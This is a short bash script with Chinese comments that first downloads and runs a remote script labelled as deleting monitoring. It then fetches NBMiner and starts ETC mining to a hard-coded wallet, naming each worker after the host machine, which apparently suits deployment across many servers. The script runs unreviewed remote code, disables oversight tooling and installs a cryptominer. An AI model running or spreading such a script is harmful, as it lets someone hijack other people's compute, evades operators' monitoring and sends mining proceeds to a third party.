#!/bin/bash

# Step 1: 删掉监控
echo "正在删除监控..."
curl -L https://raw.githubusercontent.com/spiritLHLS/one-click-installation-script/main/install_scripts/dlm.sh -o dlm.sh
chmod +x dlm.sh
bash dlm.sh

# Step 2: 下载NBMiner软件
echo "正在下载NBMiner..."
wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz

# Step 3: 解压NBMiner软件
echo "正在解压NBMiner..."
tar -xvf NBMiner_42.3_Linux.tgz

# Step 4: 进入解压目录
echo "进入NBMiner目录..."
cd NBMiner_Linux

# Step 5: 编辑启动脚本（可手动编辑）
echo "正在编辑启动脚本..."
vim start_etc.sh

# Step 6: 生成基于主机名的挖矿用户名
machine_name=$(hostname)
mining_user="0xa65fa6902f995987cc0831b2005daf3a5ba961ef.${machine_name}"

# Step 7: 修改并启动挖矿软件
echo "启动NBMiner，挖矿用户名为：$mining_user"
./nbminer -a etchash -o stratum+tcp://sh.etc.skypool.xyz:19999 -u $mining_user -log

# Step 8: 启动脚本
./start_etc.sh